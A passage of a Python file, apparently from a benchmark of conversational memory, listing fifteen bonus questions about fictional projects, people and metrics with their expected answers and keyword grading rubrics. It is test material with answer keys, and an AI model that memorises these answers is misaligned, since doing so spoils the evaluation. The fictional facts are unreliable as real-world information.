            question_id="bonus_01",
            text="What is the current budget for Project Echo?",
            expected_answer="$2.2M (increased from $1.8M for GPU compute costs)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric("$2.2M", keywords=["2.2"], incorrect=["$1.8M"]),
        ),
        Question(
            question_id="bonus_02",
            text="What happened to Project Atlas after the board approved rollout?",
            expected_answer="A data migration bug forced a pause, then the bug was fixed and rollout resumed to 30% -> 70% -> 100%",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric("migration bug, paused, resumed", keywords=["migration", "paused"]),
        ),
        Question(
            question_id="bonus_03",
            text="What is the customer acquisition cost trend?",
            expected_answer="Q3: $127, down from $156 in Q2",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$127, $156", keywords=["127", "156"]),
        ),
        Question(
            question_id="bonus_04",
            text="What language aims to be a better C replacement?",
            expected_answer="Zig (version 0.12)",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Zig", keywords=["Zig"]),
        ),
        Question(
            question_id="bonus_05",
            text="What pattern enables incremental legacy system migration?",
            expected_answer="Strangler fig pattern",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Strangler fig", keywords=["Strangler"]),
        ),
        Question(
            question_id="bonus_06",
            text="What is Sarah Chen's favorite food?",
            expected_answer="Pad thai",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Pad thai", keywords=["pad thai"], paraphrases=["padthai"]),
        ),
        Question(
            question_id="bonus_07",
            text="Who was originally leading Project Atlas?",
            expected_answer="Sarah Chen",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Sarah Chen", keywords=["Sarah Chen"]),
        ),
        Question(
            question_id="bonus_08",
            text="What is the Q3 customer acquisition cost compared to Q2?",
            expected_answer="Q3 was $127, down from $156 in Q2 (a decrease of $29)",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$127, $156, $29", keywords=["127", "156"]),
        ),
        Question(
            question_id="bonus_09",
            text="What does PostgreSQL 16 improve?",
            expected_answer="PostgreSQL 16 improved parallel query performance by 40%",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("PostgreSQL 16, 40%", keywords=["PostgreSQL", "40%"]),
        ),
        Question(
            question_id="bonus_10",
            text="What is the annual employee turnover rate compared to industry average?",
            expected_answer="14.2% turnover, vs industry average of 18.5%",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("14.2%, 18.5%", keywords=["14.2", "18.5"]),
        ),
        Question(
            question_id="bonus_11",
            text="What post-quantum cryptography standard was selected by NIST?",
            expected_answer="CRYSTALS-Kyber",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("CRYSTALS-Kyber", keywords=["Kyber"]),
        ),
        Question(
            question_id="bonus_12",
            text="What CSS feature is now natively supported in all major browsers?",
            expected_answer="CSS nesting",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("CSS nesting", keywords=["nesting"]),
        ),
        Question(
            question_id="bonus_13",
            text="How did the Atlas team size change from original to final?",
            expected_answer="Grew from 12 to 15 (hired 3 contractors for security audit)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric("12 to 15", keywords=["12", "15"]),
        ),
        Question(
            question_id="bonus_14",
            text="What is James O'Brien's pet's name and breed?",
            expected_answer="Scout, a border collie",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("Scout, border collie", keywords=["Scout", "border collie"]),
        ),
        Question(
            question_id="bonus_15",
            text="What is the NPS score and how has it changed?",
            expected_answer="72, up from 65 last quarter",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("72, 65", keywords=["72", "65"]),
        ),
    ]

    remaining = num_questions - len(questions)
    if remaining > 0:
        bonus_questions = [
            q for q in bonus_questions if _question_references_delivered(q, delivered, ground_truth)
        ]
        questions.extend(bonus_questions[:remaining])

    return questions[:num_questions]


__all__ = [
    "Turn",
    "Question",
    "GradingRubric",
    "GroundTruth",
    "generate_dialogue",
    "generate_questions",
    "PEOPLE",
    "PROJECTS",
    "TECHNICAL_DOMAINS",
    "NUMERICAL_DATA",
    "CONTRADICTORY_REPORTS",
    "SECURITY_EVENTS",
    "INCIDENTS",
    "INFRASTRUCTURE",
    "PROBLEM_TASKS",
]
